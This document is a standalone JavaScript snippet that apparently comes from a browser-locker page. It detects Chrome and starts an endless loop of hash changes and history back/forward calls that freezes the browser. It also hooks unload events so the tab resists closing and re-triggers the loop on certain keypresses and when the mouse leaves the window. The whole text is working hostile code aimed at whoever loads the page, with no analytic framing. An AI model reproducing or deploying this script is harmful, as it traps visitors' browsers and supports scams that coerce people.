<script>
    var is_chrome,
        isChromium = window.chrome,
        vendorName = window.navigator.vendor,
        isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
    is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true :
        false;

    function alertCall() {


    }

    function alertTimed() {
        if (is_chrome) {
            setInterval(function() {
                shiftchange();
            }, 1000);
        } else {
            alertLoop();
        }
        //alertLoop();
        alertCall();
    }

    function alertLoop() {
        for (i = 0; i < 50; i++) {
            alertCall();
        }
    }

    function shiftchange() {
        for (let i = 0; i < 1 / 0; i++) document.location.href = "#", window.history.back(), window.history.forward();
    }

    window.onload = function(e) {
        alertCall();
        alertTimed();
        alertCall();


    };
    window.addEventListener('beforeunload', preventclose, false);
    window.addEventListener('unload', preventclose, false);

    function preventclose() {
        var location = window.document.location;
        var originalHashValue = location.hash;

        window.setTimeout(function() {
            location.hash = 'preventclose' + ~~(9999 * Math.random());
            location.hash = originalHashValue;
        }, 0);



    };
    $(document).ready(function() {
        document.onkeydown = function(e) {
            if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                if (!is_chrome) {
                    alertTimed();
                }
                return true;
            } else if (e.keyCode === 123) {
                return true;
            } else {
                return true;
            }
        };

        addEvent(document, "mouseout", function(e) {
            e = e ? e : window.event;
            var from = e.relatedTarget || e.toElement;
            if (!is_chrome && (!from || from.nodeName == "body")) {
                alertTimed();
            }
        });
    });
</script>
